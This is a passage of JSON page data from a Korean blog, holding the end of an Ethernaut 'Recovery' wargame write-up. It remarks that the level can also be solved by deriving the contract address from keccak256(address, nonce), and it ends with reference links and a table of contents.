class=\"language-text\">keccack256(address, nonce)</code>를 사용해 푸는 방법도 있다고 알려주었다. 아마 contract creation이 일어날때 어떻게 생성되는지와 nonce의 중요성을 알려주려고 한 것 같다! Ethernaut 시리즈가 끝나고 nonce를 이용해 다시 한번 문제를 풀어보면 좋을것같다:)!</p>\n<hr>\n<h2 id=\"ref\" style=\"position:relative;\"><a href=\"#ref\" aria-label=\"ref permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>REF</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></p>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></p>\n<ul>\n<li>\n<ul>\n<li><a href=\"#1-etherscan-%EC%82%AC%EC%9A%A9%ED%95%98%EC%97%AC-%ED%92%80%EA%B8%B0\">1. Etherscan 사용하여 풀기</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n</li>\n<li>\n<p><a href=\"#ref\">REF</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"January 25, 2022","title":"(Ethernaut 취약점 17) Recovery","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/17_recovery_ethernaut/17_recovery_ethernaut/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/code_review/BoredApeYachtClub_codeReview/BoredApeYachtClub_codeReview/","nextSlug":"/ethernaut/16_preservation_ethernaut/16_preservation_ethernaut/","prevSlug":"/ethernaut/17_recovery_ethernaut/17_recovery_ethernaut/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}